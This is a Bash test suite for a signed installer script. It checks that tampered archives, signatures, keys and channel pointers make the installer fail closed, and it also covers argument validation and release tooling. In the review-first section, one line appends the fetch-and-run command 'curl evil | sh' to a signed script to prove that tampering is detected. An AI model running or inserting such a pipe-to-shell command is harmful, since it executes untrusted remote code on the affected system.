#!/usr/bin/env bash
# install.sh behavior and tamper matrix (spec 3.2, 3.7; PLAN section 9). Usage: run.sh SHELL (dash|bash|sh)
# Every tamper case must exit 5 and must never have executed the unpacked sm.
set -u
SH=${1:?usage: run.sh SHELL}
# shellcheck source=test/install/lib.sh
. "$(dirname "$0")/lib.sh"
trap 'rm -rf "${WORLDS[@]+"${WORLDS[@]}"}"' EXIT
WORLDS=()
world() { new_world; WORLDS+=("$W"); }
pinned() { run_install "$SH" SUPERMGMT_VERSION=v1.0.0 "$@"; }

echo "== install.sh under $SH"

world; pinned -- server --flag
expect "pinned version installs and passes mode and args to sm" 0 "stub-sm install server --flag"
world; run_install "$SH" SUPERMGMT_VERSION=v1.0.0 SUPERMGMT_MODE=client --
expect "SUPERMGMT_MODE selects the mode" 0 "stub-sm install client"
world; run_install "$SH" --
expect "default channel stable resolves the signed pointer" 0 "installing v1.0.0"
world; run_install "$SH" SUPERMGMT_CHANNEL=beta --
expect "beta channel resolves the beta pointer" 0 "installing v1.1.0-beta.1"
world; run_install "$SH" SUPERMGMT_VERSION=v1.1.0-beta.1 --
expect "pinned prerelease installs" 0 "installing v1.1.0-beta.1"

world; OUT=$(cat "$INSTALL" | env "SUPERMGMT_RELEASE_BASE_URL=$BASE" "SM_MARKER=$MARKER" SUPERMGMT_NONINTERACTIVE=1 SUPERMGMT_VERSION=v1.0.0 "$SH" -s -- client 2>&1); RC=$?
expect "piped from curl: sm still runs and the script is not consumed twice" 0 "stub-sm install client"

echo "== tamper matrix (exit 5)"
world; for a in "$W"/rel/v1.0.0/sm_1.0.0_*.tar.gz; do printf 'x' >>"$a"; done
pinned --; expect "modified archive" 5 "checksum mismatch"
world; sed -i.bak 's/^[0-9a-f]/0/' "$W/rel/v1.0.0/checksums.txt"; pinned --
expect "modified checksums.txt" 5 "signature verification failed"
world; printf 'garbage\n' >"$W/rel/v1.0.0/checksums.txt.sig"; pinned --
expect "garbage signature" 5 "signature verification failed"
world; cp "$W/rel/v1.0.0/install.sh.sig" "$W/rel/v1.0.0/checksums.txt.sig"; pinned --
expect "signature swapped from another file" 5 "signature verification failed"
world; build_release "$W/rel" v1.0.0 "$W/other"; pinned --
expect "signed by an untrusted key" 5 "signature verification failed"
world; render_install "$REPO/install.sh" "$INSTALL" "$W/trusted/allowed_signers" "$W/trusted/key.pub"; pinned --
expect "signed by a revoked key" 5 "signature verification failed"
world; "$REL/testkey.sh" "$W/expired" 'valid-before="20200101"' >/dev/null 2>&1
render_install "$REPO/install.sh" "$INSTALL" "$W/expired/allowed_signers"; build_release "$W/rel" v1.0.0 "$W/expired"; pinned --
expect "signed by an expired key" 5 "signature verification failed"
world; "$REL/testkey.sh" "$W/future" 'valid-after="20990101"' >/dev/null 2>&1
render_install "$REPO/install.sh" "$INSTALL" "$W/future/allowed_signers"; build_release "$W/rel" v1.0.0 "$W/future"; pinned --
expect "signed by a key that is not valid yet" 5 "signature verification failed"
world; cp "$W/rel/v1.0.1/checksums.txt" "$W/rel/v1.0.1/checksums.txt.sig" "$W/rel/v1.0.0/"; pinned --
expect "old request served a different signed version" 5 "another version"
world; rm "$W"/rel/v1.0.0/sm_1.0.0_*.tar.gz; pinned --
expect "archive missing" 5 "download failed"
world; rm "$W/rel/v1.0.0/checksums.txt.sig"; pinned --
expect "signature missing" 5 "download failed"
world; cp "$REPO/install.sh" "$INSTALL"; pinned --
expect "production placeholder trust root fails closed" 5 "signature verification failed"

echo "== channel pointers (exit 5)"
world; publish_channel stable v1.0.0 "$(iso_at -$((40 * DAY)))" "$(iso_at -$((10 * DAY)))"; run_install "$SH" --
expect "expired channel" 5 "expired"
world; publish_channel stable v1.0.0 "$(iso_at 3600)" "$(iso_at $((20 * DAY)))"; run_install "$SH" --
expect "channel issued in the future" 5 "future"
world; printf '{"channel":"stable","version":"v1.0.0","issued_at":"%s","valid_until":"%s"}\n' "$(iso_at -DAY)" "$(iso_at $((30 * DAY)))" >"$W/rel/channels/stable.json"
sign_with "$W/trusted" "$W/rel/channels/stable.json"; run_install "$SH" --
expect "channel validity beyond 30 days" 5 "exceeds 30 days"
world; sed -i.bak 's/v1.0.0/v1.0.1/' "$W/rel/channels/stable.json"; run_install "$SH" --
expect "channel version edited" 5 "signature verification failed"
world; cp "$W/rel/channels/beta.json" "$W/rel/channels/stable.json"; cp "$W/rel/channels/beta.json.sig" "$W/rel/channels/stable.json.sig"; run_install "$SH" --
expect "beta pointer served as stable" 5 "another channel"
world; publish_channel stable v1.1.0-beta.1 "$(iso_at -DAY)" "$(iso_at $((20 * DAY)))"; run_install "$SH" --
expect "stable pointer to a beta release" 5 "another channel"

echo "== prerequisites, platform and arguments"
world; printf '#!/bin/sh\necho "unknown option -- Y" >&2\nexit 1\n' >"$W/stubs/ssh-keygen"; chmod +x "$W/stubs/ssh-keygen"; pinned --
expect "ssh-keygen without -Y" 4 "OpenSSH"
world; sed -i.bak 's/^U1NIU0lHAAAAAQ/U1NIU0lHAAAAAB/' "$INSTALL"; pinned --
expect "verifier self-test fails" 4 "cannot verify"
world; printf '#!/bin/sh\necho FreeBSD\n' >"$W/stubs/uname"; chmod +x "$W/stubs/uname"; pinned --
expect "unsupported OS" 3 "unsupported OS"
world; run_install "$SH" SUPERMGMT_VERSION=latestish --; expect "invalid version" 2 "invalid SUPERMGMT_VERSION"
world; run_install "$SH" SUPERMGMT_CHANNEL=nightly --; expect "invalid channel" 2 "invalid SUPERMGMT_CHANNEL"
world; pinned -- bogus-mode; expect "invalid mode" 2 "invalid mode"
if [ "$(wc -l <"$REPO/install.sh")" -lt 300 ]; then RC=0; else RC=1; fi; OUT=; expect_rc "install.sh is under 300 lines" 0

echo "== review-first: install.sh and join.sh signatures"
world; echo '#!/bin/sh' >"$W/join.sh"; sign_with "$W/trusted" "$W/join.sh"
"$REL/verify-asset.sh" "$W/join.sh" "$W/trusted/allowed_signers" >/dev/null 2>&1; RC=$?; OUT=; expect_rc "signed join.sh verifies" 0
echo 'curl evil | sh' >>"$W/join.sh"
OUT=$("$REL/verify-asset.sh" "$W/join.sh" "$W/trusted/allowed_signers" 2>&1); RC=$?; expect_rc "modified join.sh" 5
OUT=$("$REL/verify-asset.sh" "$W/rel/v1.0.0/install.sh" "$INSTALL" 2>&1); RC=$?; expect_rc "released install.sh verifies against the rendered trust root" 0
echo '# evil' >>"$W/rel/v1.0.0/install.sh"
OUT=$("$REL/verify-asset.sh" "$W/rel/v1.0.0/install.sh" "$INSTALL" 2>&1); RC=$?; expect_rc "modified install.sh" 5
OUT=$("$REL/verify-asset.sh" "$W/rel/v1.0.0/checksums.txt" "$REPO/install.sh" 2>&1); RC=$?; expect_rc "placeholder trust root verifies nothing" 5

echo "== release plumbing"
world; OUT=$(SM_RELEASE_CHECK_STRUCTURE_ONLY=1 "$REL/check.sh" "$W/rel/v1.0.0" "$W/trusted/allowed_signers" 2>&1); RC=$?; expect_rc "release-check accepts a finalized release" 0
OUT=$("$REL/check.sh" "$W/rel/v1.0.0" "$W/trusted/allowed_signers" 2>&1); RC=$?; expect_rc "release-check rejects archives without notices for the compiled sm" 1
rm "$W/rel/v1.0.0/sm_1.0.0_linux_arm64.tar.gz.spdx.json"
OUT=$("$REL/check.sh" "$W/rel/v1.0.0" "$W/trusted/allowed_signers" 2>&1); RC=$?; expect_rc "release-check rejects a missing SBOM" 1
OUT=$("$REL/check.sh" "$W/rel/v1.0.1" "$W/other/allowed_signers" 2>&1); RC=$?; expect_rc "release-check rejects an unexpected signer" 1
world; OUT=$(SM_SIGNING_KEY_FILE="$W/trusted/key" "$REL/channel.sh" stable v1.0.0 "$(iso_at -DAY)" "$(iso_at $((40 * DAY)))" "$W/x" 2>&1); RC=$?
expect_rc "channel signer refuses a window over 30 days" 2
select_tag() { printf '%s\n' "${@:2}" | "$REL/select-version.sh" "$1" 2>&1; }
TAGS=(v1.2.0-beta.2 v1.1.0 v1.1.0-beta.1 v1.0.0 not-a-version)
OUT=$(select_tag stable "${TAGS[@]}"); RC=$?; [ "$OUT" = v1.1.0 ] || RC=1; expect_rc "stable pointer skips newer prereleases" 0
OUT=$(select_tag beta "${TAGS[@]}"); RC=$?; [ "$OUT" = v1.2.0-beta.2 ] || RC=1; expect_rc "beta pointer takes only prereleases" 0
OUT=$(select_tag beta v1.0.0 v0.9.0); RC=$?; [ -z "$OUT" ] || RC=1; expect_rc "no prerelease means no beta pointer" 0
OUT=$(select_tag nightly v1.0.0); RC=$?; expect_rc "selector rejects an unknown channel" 2
world; tree="$W/tree"; mkdir -p "$tree/scripts"; cp -R "$REPO/packaging" "$REPO/install.sh" "$tree/"; echo '#!/bin/sh' >"$tree/scripts/join.sh"
mkdir -p "$W/stage"; cp "$W"/rel/v1.0.0/sm_* "$W/stage/"
OUT=$(SM_SIGNING_KEY_FILE="$W/trusted/key" "$tree/packaging/release/finalize.sh" "$W/stage" v1.0.0 2>&1); RC=$?
[ -f "$W/stage/join.sh.sig" ] || RC=1; expect_rc "finalize signs scripts/join.sh when present" 0

finish
